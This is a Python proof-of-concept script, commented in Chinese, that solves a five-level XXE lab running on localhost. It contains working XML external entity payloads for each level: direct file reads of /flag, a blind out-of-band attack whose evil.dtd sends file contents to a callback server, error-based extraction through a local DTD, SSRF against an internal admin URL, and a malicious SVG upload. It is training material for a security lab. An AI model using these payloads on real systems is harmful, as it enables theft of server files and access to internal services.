#!/usr/bin/env python3
"""
XXE 靶场一键验证（纯标准库，不依赖 requests）

跑之前先起靶场：
    ./setup.sh

然后：
    python3 poc/xxe_exp.py           # 五关全打
    python3 poc/xxe_exp.py 1 3       # 只打指定关卡

L2 需要「容器能访问宿主机」：脚本会自己起一个临时 HTTP 服务，
容器通过 host.docker.internal:<随机端口> 回连，不需要你另开窗口。
"""

import os
import re
import sys
import uuid
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlencode, urlparse, parse_qs
from urllib.request import Request, urlopen
from urllib.error import URLError

BASE = os.environ.get("BASE", "http://127.0.0.1:8895").rstrip("/")
OOB_HOST = os.environ.get("OOB_HOST", "host.docker.internal")
INTERNAL = os.environ.get("INTERNAL_URL", "http://internal/admin.php")

FLAG_RE = re.compile(r"FLAG\{[^}]*\}|FLAG_[A-Za-z0-9_]+")


# ---------- 通用 HTTP ----------

def post_form(path, data, timeout=15):
    body = urlencode(data).encode()
    req = Request(BASE + path, data=body,
                  headers={"Content-Type": "application/x-www-form-urlencoded"})
    with urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def post_file(path, field, filename, content, ctype="image/svg+xml", timeout=15):
    boundary = "----xxe" + uuid.uuid4().hex
    buf = []
    buf.append(f"--{boundary}\r\n".encode())
    buf.append(f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode())
    buf.append(f"Content-Type: {ctype}\r\n\r\n".encode())
    buf.append(content.encode() if isinstance(content, str) else content)
    buf.append(f"\r\n--{boundary}--\r\n".encode())
    body = b"".join(buf)

    req = Request(BASE + path, data=body,
                  headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    with urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def grab_flag(text):
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


# ---------- L2 用的临时外带服务器 ----------

class Oob:
    """一个只活到 L2 结束的小 HTTP 服务：发 DTD、收数据"""

    def __init__(self):
        self.event = threading.Event()
        self.data = None
        self.port = None
        self.srv = None

    def start(self):
        state = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                u = urlparse(self.path)
                port = state.port

                if u.path == "/evil.dtd":
                    # 目标用 /flag_blind：内容不含 {} 和换行，否则 libxml 判 URI 非法、请求发不出去
                    dtd = (
                        '<!ENTITY % file SYSTEM "file:///flag_blind">\n'
                        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
                        f"'http://{OOB_HOST}:{port}/collect?d=%file;'>\">\n"
                        "%eval;\n"
                        "%exfil;\n"
                    )
                    raw = dtd.encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/xml-dtd; charset=utf-8")
                    self.send_header("Content-Length", str(len(raw)))
                    self.end_headers()
                    self.wfile.write(raw)
                    return

                if u.path == "/collect":
                    state.data = parse_qs(u.query).get("d", [""])[0]
                    state.event.set()
                    self.send_response(200)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return

                self.send_response(404)
                self.end_headers()

        self.srv = ThreadingHTTPServer(("0.0.0.0", 0), H)
        self.port = self.srv.server_address[1]
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def stop(self):
        if self.srv:
            self.srv.shutdown()
            self.srv.server_close()


# ---------- 五关 ----------

def level1():
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<order>
  <item>&xxe;</item>
</order>"""
    html = post_form("/l1.php", {"xml": payload})
    return grab_flag(html), "实体直接展开，回显在页面上"


def level2():
    oob = Oob()
    oob.start()
    try:
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://{OOB_HOST}:{oob.port}/evil.dtd">
  %remote;
]>
<r>hi</r>"""
        post_form("/l2.php", {"xml": payload})
        got = oob.event.wait(timeout=10)
        return (oob.data if got else None), f"外部 DTD 经 {OOB_HOST}:{oob.port} 外带"
    finally:
        oob.stop()


def level3():
    # 关键：payload 走的是「本地 DTD」，不需要出网，靠报错把内容带回来
    payload = """<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "file:///usr/share/xml/xxe-lab.dtd">
  %remote;
]>
<r>x</r>"""
    html = post_form("/l3.php", {"xml": payload})
    return grab_flag(html), "本地 DTD 触发加载失败，报错里带出文件内容（不用出网）"


def level4():
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY ssrf SYSTEM "{INTERNAL}">]>
<r>&ssrf;</r>"""
    html = post_form("/l4.php", {"xml": payload})
    return grab_flag(html), f"解析器替我们去请求 {INTERNAL}"


def level5():
    svg = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>"""
    html = post_file("/l5.php", "avatar", "avatar.svg", svg)
    return grab_flag(html), "上传 SVG，解析时触发"


LEVELS = {1: ("L1 基础（有回显）", level1),
          2: ("L2 盲打（OOB 外带）", level2),
          3: ("L3 报错型", level3),
          4: ("L4 XXE → SSRF", level4),
          5: ("L5 上传 SVG", level5)}


def main():
    wanted = [int(a) for a in sys.argv[1:] if a.isdigit()] or list(LEVELS)

    print(f"目标：{BASE}\n")
    failed = []

    for n in wanted:
        name, fn = LEVELS[n]
        try:
            flag, note = fn()
        except URLError as e:
            print(f"  {name:<22} 连接失败 {e}")
            failed.append(n)
            continue
        except Exception as e:  # noqa: BLE001
            print(f"  {name:<22} 异常 {type(e).__name__}: {e}")
            failed.append(n)
            continue

        if flag:
            print(f"  {name:<22} OK   {flag}   ({note})")
        else:
            print(f"  {name:<22} 没拿到 flag")
            failed.append(n)

    print()
    if failed:
        print("没通的关卡：" + ", ".join(f"L{i}" for i in failed))
        print("排查顺序：docker ps 看容器活着没 → docker compose logs web → 手工访问页面看报错")
        sys.exit(1)
    print("五关全通。")


if __name__ == "__main__":
    main()
